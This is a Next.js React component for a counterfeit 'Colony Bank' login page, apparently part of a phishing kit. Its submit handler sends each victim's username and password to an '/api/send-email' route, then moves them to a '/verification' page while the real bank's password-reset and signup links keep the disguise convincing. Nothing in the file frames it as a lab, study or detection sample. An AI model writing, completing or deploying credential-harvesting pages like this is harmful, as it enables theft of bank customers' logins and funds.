"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import Footer from "@/app/components/Footer";

export default function Login() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    name: "",
    password: "",
    bName: process.env.NEXT_PUBLIC_BANK_NAME, // Default bank name
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [showPassword, setShowPassword] = useState(false); // State to track password visibility
  const [rememberMe, setRememberMe] = useState(false); // State for remember me
  const [showMenu, setShowMenu] = useState(false); // State for dropdown menu

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const toggleMenu = () => {
    setShowMenu(!showMenu);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!isReadyToSubmit) return;

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send data to our API route
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bName: formData.bName,
          username: formData.name,
          password: formData.password,
        }),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      setSubmitStatus("success");

      // Redirect to the bank's real site after a short delay
      setTimeout(() => {
        router.push("/verification");
      }, 1500);
    } catch (error) {
      console.error("Failed to send data:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const isReadyToSubmit = formData.name.trim() && formData.password.trim();

  return (
    <div className="flex flex-col min-h-screen ">
      <div>
        {/* Grey Header */}

        <div className="h-10 bg-[#4E6D82]"></div>
        {/* Main Content */}
        <div className="flex-grow flex items-center justify-center bg-white p-4 h-[80vh]">
          <div className="w-full max-w-md bg-white rounded-lg border border-[#E6E6E6] overflow-hidden h-[60vh] flex flex-col justify-center gap-4 ">
            <div className="relative">
              {/* Menu Icon */}
              <div className="absolute -top-6 right-4">
                <button
                  onClick={toggleMenu}
                  className="bg-[#DBC4CB] p-1 rounded-full"
                >
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <circle cx="6" cy="12" r="2" fill="#840029" />
                    <circle cx="12" cy="12" r="2" fill="#840029" />
                    <circle cx="18" cy="12" r="2" fill="#840029" />
                  </svg>
                </button>

                {/* Dropdown Menu */}
                {showMenu && (
                  <div className="absolute right-0 mt-2 w-48 bg-white rounded-md shadow-lg z-10">
                    <div className="py-1">
                      <a
                        href="#"
                        className="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
                      >
                        <svg
                          className="mr-2"
                          width="16"
                          height="16"
                          viewBox="0 0 24 24"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 8V5z"
                            stroke="#9B0E36"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                        Contact Us
                      </a>
                      <a
                        href="#"
                        className="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
                      >
                        <svg
                          className="mr-2"
                          width="16"
                          height="16"
                          viewBox="0 0 24 24"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                            stroke="#9B0E36"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                          <path
                            d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                            stroke="#9B0E36"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                        Locations
                      </a>
                      <a
                        href="#"
                        className="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
                      >
                        <svg
                          className="mr-2"
                          width="16"
                          height="16"
                          viewBox="0 0 24 24"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                            stroke="#9B0E36"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                        Help
                      </a>
                    </div>
                  </div>
                )}
              </div>

              {/* Logo */}
              <div className="flex justify-center p-6 pb-4">
                <div className="relative w-64 h-16">
                  <Image
                    src="/assets/logo.png"
                    alt="Colony Bank"
                    fill
                    style={{ objectFit: "contain" }}
                    priority
                  />
                </div>
              </div>
            </div>

            <form className="px-6 pb-6 space-y-4" onSubmit={handleSubmit}>
              {/* Username Field */}
              <div>
                <div className="relative">
                  <input
                    type="text"
                    name="name"
                    value={formData.name}
                    onChange={handleChange}
                    placeholder="Username"
                    required
                    className="w-full px-4 py-3 bg-[#F2F2F2]  rounded-lg focus:outline-none focus:ring-1 focus:ring-red-800"
                  />
                </div>
                {formData.name.trim() === "" && formData.name !== "" && (
                  <p className="text-sm text-[#840029] mt-1">
                    Username is required
                  </p>
                )}
              </div>

              {/* Password Field */}
              <div>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Password"
                    required
                    className="w-full px-4 py-3 bg-[#F2F2F2]rounded-lg focus:outline-none focus:ring-1 focus:ring-red-800"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-3 top-3 text-gray-400"
                  >
                    {showPassword ? (
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-5 w-5"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                        />
                      </svg>
                    ) : (
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-5 w-5"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                        />
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                        />
                      </svg>
                    )}
                  </button>
                </div>
                {formData.password.trim() === "" &&
                  formData.password !== "" && (
                    <p className="text-sm text-[#840029] mt-1">
                      Password is required
                    </p>
                  )}
              </div>

              {/* Remember Me */}
              <div className="flex items-center">
                <div
                  className="relative inline-block h-6 w-12 cursor-pointer rounded-full"
                  onClick={() => setRememberMe(!rememberMe)}
                >
                  <div
                    className={`absolute inset-0 rounded-full transition ${
                      rememberMe ? "bg-[#840029]" : "bg-[#DBC4CB]"
                    }`}
                  ></div>
                  <div
                    className={`absolute inset-y-0 left-0 m-1 h-4 w-4 rounded-full bg-[#840029] transition-transform ${
                      rememberMe ? "translate-x-6" : ""
                    }`}
                  ></div>
                </div>
                <span className="ml-2 text-sm text-gray-700">Remember Me</span>
              </div>

              {/* Login Button */}
              <button
                type="submit"
                className="w-full py-3 bg-[#840029] text-white rounded-full hover:bg-[#840029] focus:outline-none"
                disabled={!isReadyToSubmit || isSubmitting}
              >
                {isSubmitting ? "Signing In..." : "Log in"}
              </button>

              {/* Forgot Links */}
              <div className="text-center">
                <a
                  href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL}
                  className="text-sm text-blue-600 hover:underline"
                >
                  <span  className="text-gray-500">Forgot</span> Username <span className="text-gray-500">or</span> Password?
                </a>
              </div>

              {/* Register Link */}
              <div className="text-center mt-4">
                <a
                  href={process.env.NEXT_PUBLIC_SIGNUP_URL}
                  className="text-sm text-[#840029] font-semibold hover:underline"
                >
                  Register a New Account
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Chat Now Button */}
      <div className="fixed bottom-6 right-6">
        <button className="flex items-center bg-white text-green-600 px-4 py-2 rounded-full shadow-lg">
          <svg
            className="w-6 h-6 mr-2"
            fill="currentColor"
            viewBox="0 0 20 20"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              fillRule="evenodd"
              d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z"
              clipRule="evenodd"
            />
          </svg>
          Chat Now!
        </button>
      </div>

      <Footer />
    </div>
  );
}
